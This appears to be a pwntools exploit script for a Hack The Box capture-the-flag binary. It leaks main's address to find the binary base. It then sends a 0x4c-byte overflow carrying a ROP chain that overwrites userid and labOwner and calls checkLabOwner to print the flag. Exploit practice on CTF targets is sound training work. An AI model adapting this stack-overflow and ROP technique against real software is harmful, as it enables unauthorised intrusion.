#!/usr/bin/env python3

import argparse
import pwn

from pwnlib.util.misc import run_in_new_terminal

# ====================================================================
#                      CONFIGURATION PARAMETERS
# These are to be adjusted to fit the challenge:
#   binary : path to a sample of the challenge binary
#   libc   : path to the libc the program uses (if known)
#   host   : hostname where the challenge is running
#   port   : port where the challenge is listenting
# ====================================================================

binary = './lab'
libc = None
host = 'docker.hackthebox.eu'
port = 32435

# ====================================================================
#   GLOBALS
# ====================================================================

T     = None      # The Target
LIBC  = None      # Libc ELF
BIN   = None      # Target binary ELF

# ====================================================================
#   CLASSES AND FUNCTIONS
# ====================================================================

class Target:
    '''
    Code that interacts with the challenge.
    '''

    def __init__(self, remote, binary=None, libc=None, host=None, port=None, *a, **kw):
        if not remote:    # Local binary
            self.tube = pwn.process(binary, *a, **kw) if libc is None else \
                    pwn.process(binary, env={'LD_PRELOAD': libc}, *a, **kw)
        else:             # Remote challenge
            self.tube = pwn.remote(host, port)

    def __getattr__(self, attr):
        ''' Catch references to pwn.tube methods such as recvuntil, etc '''
        return self.tube.__getattribute__(attr)

    def attach(self):
        ''' Attach to the running process in a radare2 session '''
        if isinstance(self.tube, pwn.process):  # Only attach if we are running a binary
            run_in_new_terminal('r2 -AAA -d %d' % self.tube.pid)
            raw_input('PAUSED [PRESS ENTER TO CONTINUE]')

    # ================================================================
    #   CUSTOM ACTIONS: For easy interaction with the challenge
    # ================================================================


def parse_args():
    ''' Parse program arguments '''
    global port
    parser = argparse.ArgumentParser(usage='%(prog)s [OPTIONS]')
    parser.add_argument('-r', '--remote', help='Attack to the remote target', action='store_true')
    parser.add_argument('-p', '--port', help='Remote target port', nargs='?', type=int, default=port)
    return parser.parse_args()

# ====================================================================
#   MAIN -- FLOW OF THE PROGRAM
# ====================================================================

if __name__ == '__main__':

    # ================================================================
    #   INITIALIZATION
    # ================================================================

    args = parse_args()
    if libc is not None:
        LIBC = pwn.ELF(libc, checksec=False)
    if binary is not None:
        BIN = pwn.ELF(binary, checksec=False)

    T = Target(args.remote, binary, libc, host, args.port)

    # ===============================================================
    #   EXPLOIT STARTS HERE
    # ===============================================================

    # Useful gadgets.
    POP_GADGET = 0x1402  # pop edi; pop ebp; ret
    MOV_GADGET = 0x1216  # mov dword [edi], ebp; ret

    # (1) Get main() address.
    T.recvuntil('Main is at ')
    BIN.address = int(T.recvline(), 16) - BIN.sym['main']
    T.info(f'base @ {hex(BIN.address)}')

    # (2) ROP chain:
    #   - Set userid to 0x1337
    #   - Set labOwner to 'QHpix'
    #   - Call checkLabOwner to print the flag
    p32 = lambda x: pwn.p32(BIN.address + x)  # pack using BIN.address
    rop = p32(POP_GADGET) + pwn.p32(BIN.sym['userid']) + pwn.p32(0x1337) + p32(MOV_GADGET)
    rop += p32(POP_GADGET) + pwn.p32(BIN.sym['labOwner']) + b'QHpi' + p32(MOV_GADGET)
    rop += p32(POP_GADGET) + pwn.p32(BIN.sym['labOwner'] + 4) + pwn.p32(0x78) + p32(MOV_GADGET)
    rop += pwn.p32(BIN.sym['checkLabOwner'])

    T.sendlineafter('Enter your input: ', b'A' * 0x4c + rop)
    T.success(T.recvall())
